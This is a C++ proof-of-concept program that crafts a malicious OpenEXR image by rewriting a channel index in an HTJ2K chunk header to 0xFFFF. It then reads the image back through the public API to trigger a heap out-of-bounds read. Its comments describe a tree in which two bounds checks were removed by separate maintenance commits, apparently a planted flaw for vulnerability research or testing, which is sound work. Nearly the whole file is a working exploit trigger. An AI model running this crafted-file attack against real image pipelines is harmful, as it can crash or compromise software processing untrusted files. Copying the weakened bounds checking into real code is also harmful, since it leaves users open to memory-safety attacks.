// PoC probe for a delocalized HTJ2K channel-map out-of-bounds read in OpenEXR.
//
// Reached entirely through OpenEXR's public C++ API (Imf::RgbaOutputFile /
// Imf::RgbaInputFile) with an in-contract crafted .exr file.
//
// Background
// ----------
// An HTJ2K-compressed chunk begins with a small channel-map header
//     uint16 'HT' | uint32 payload_len | uint16 NCH | uint16 file_index[NCH]
// that maps each JPEG-2000 codestream component to an OpenEXR file channel.
// On decode, read_header() (internal_ht_common.cpp) parses these file_index
// values and ht_undo_impl() (internal_ht.cpp) uses each file_index to index
// the decode pipeline's per-channel array (size == channel_count) while
// computing raster-line offsets.
//
// In the shipped (resulting) tree two independent bounds checks that used to
// confine file_index < channel_count have each been removed by a separate,
// individually-benign maintenance commit, so a crafted file_index larger than
// channel_count flows into "for (i = 0; i < file_i; ++i) channels[i]",
// reading far past the end of the channels array -> ASan heap-buffer-overflow.
//
// This program writes a valid HTJ2K256 RGBA file, rewrites one file_index in
// the chunk header to 0xFFFF (65535, distinct from the others so the duplicate
// check still passes), and reads the pixels back.

#include <ImfRgbaFile.h>
#include <ImfArray.h>
#include <ImfHeader.h>
#include <ImfCompression.h>

#include <cstdio>
#include <cstdint>
#include <cstring>
#include <vector>
#include <string>
#include <fstream>

using namespace Imf;
using namespace Imath;

static std::vector<unsigned char> readAll (const char* path)
{
    std::ifstream f (path, std::ios::binary);
    return std::vector<unsigned char> (
        (std::istreambuf_iterator<char> (f)),
        std::istreambuf_iterator<char> ());
}

static void writeAll (const char* path, const std::vector<unsigned char>& b)
{
    std::ofstream f (path, std::ios::binary);
    f.write (reinterpret_cast<const char*> (b.data ()), (std::streamsize) b.size ());
}

int main (void)
{
    const char* clean   = "/tmp/poc_clean.exr";
    const char* crafted = "/tmp/poc_crafted.exr";

    const int W = 64, H = 64;

    // 1) Write a legitimate HTJ2K256-compressed RGBA file.
    {
        Header hdr ((int) W, (int) H);
        hdr.compression () = HTJ2K256_COMPRESSION;

        RgbaOutputFile out (clean, hdr, WRITE_RGBA);
        Array2D<Rgba> px (H, W);
        for (int y = 0; y < H; ++y)
            for (int x = 0; x < W; ++x)
                px[y][x] = Rgba (half (0.25f), half (0.5f), half (0.75f), half (1.f));
        out.setFrameBuffer (&px[0][0], 1, W);
        out.writePixels (H);
    }

    // 2) Locate the HTJ2K chunk-map header and corrupt one file_index.
    //    Layout: 48 54 | payload_len(4 BE) | NCH(2 BE) | file_index[NCH](2 BE each)
    //    RGBA -> channel_count == NCH == 4, payload_len == 2 + 2*4 == 10.
    std::vector<unsigned char> bytes = readAll (clean);
    bool patched = false;
    for (size_t i = 0; i + 16 <= bytes.size (); ++i)
    {
        if (bytes[i] == 0x48 && bytes[i + 1] == 0x54)
        {
            uint32_t plen = (uint32_t (bytes[i + 2]) << 24) |
                            (uint32_t (bytes[i + 3]) << 16) |
                            (uint32_t (bytes[i + 4]) << 8) |
                            (uint32_t (bytes[i + 5]));
            uint16_t nch = (uint16_t (bytes[i + 6]) << 8) | bytes[i + 7];
            if (plen == 10 && nch == 4)
            {
                // Overwrite file_index[0] with 0xFFFF (>= channel_count,
                // and distinct from the remaining 0..3 entries).
                bytes[i + 8] = 0xFF;
                bytes[i + 9] = 0xFF;
                patched = true;
                printf ("patched HTJ2K file_index at offset %zu\n", i + 8);
                break;
            }
        }
    }
    if (!patched)
    {
        fprintf (stderr, "could not locate HTJ2K chunk header to patch\n");
        return 2;
    }
    writeAll (crafted, bytes);

    // 3) Read the crafted file back through the public API. On the resulting
    //    tree this drives the out-of-bounds read during HTJ2K decode.
    try
    {
        RgbaInputFile in (crafted);
        Box2i dw = in.dataWindow ();
        int w = dw.max.x - dw.min.x + 1;
        int h = dw.max.y - dw.min.y + 1;
        Array2D<Rgba> px (h, w);
        in.setFrameBuffer (&px[0][0] - dw.min.x - dw.min.y * w, 1, w);
        in.readPixels (dw.min.y, dw.max.y);
        printf ("read back OK (no fault) -- not vulnerable on this tree\n");
    }
    catch (const std::exception& e)
    {
        printf ("clean rejection: %s\n", e.what ());
    }
    return 0;
}
